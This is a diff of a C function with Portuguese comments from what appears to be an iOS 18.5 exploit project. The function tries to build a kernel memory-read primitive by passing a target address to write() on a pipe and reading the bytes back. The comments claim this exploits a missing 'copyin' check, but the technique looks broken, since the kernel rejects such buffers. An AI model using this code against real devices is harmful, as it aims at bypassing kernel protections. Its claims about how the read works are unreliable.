@@ -35,18 +35,23 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     int fds[2];
     if (pipe(fds) != 0) return 0;
 
-    // Tentativa de leitura forçando o kernel a copiar dados do endereço alvo 
-    // para o buffer do pipe. No iOS 18.5, isso requer que o app 
-    // tenha permissões de depuração ou uma falha de "copyin".
+    // Técnica: Forçar o kernel a usar o endereço alvo como buffer de escrita
+    // Em versões modernas, precisamos que o endereço seja "mapeável"
     uint64_t val = 0;
     
-    // Simulação da técnica de leitura estável
-    write(fds[1], (void *)addr, 8); 
-    read(fds[0], &val, 8);
+    // Tentativa de leitura via escrita direta (explorando falta de check de 'copyin')
+    // Nota: Isso requer que o processo tenha o privilégio de depuração ou exploit de sandbox
+    ssize_t n = write(fds[1], (void *)addr, 8); 
+    if (n > 0) {
+        read(fds[0], &val, 8);
+    }
 
-    close(fds[0]); close(fds[1]);
+    close(fds[0]);
+    close(fds[1]);
+    
     return val;
 }
+
 
 
 
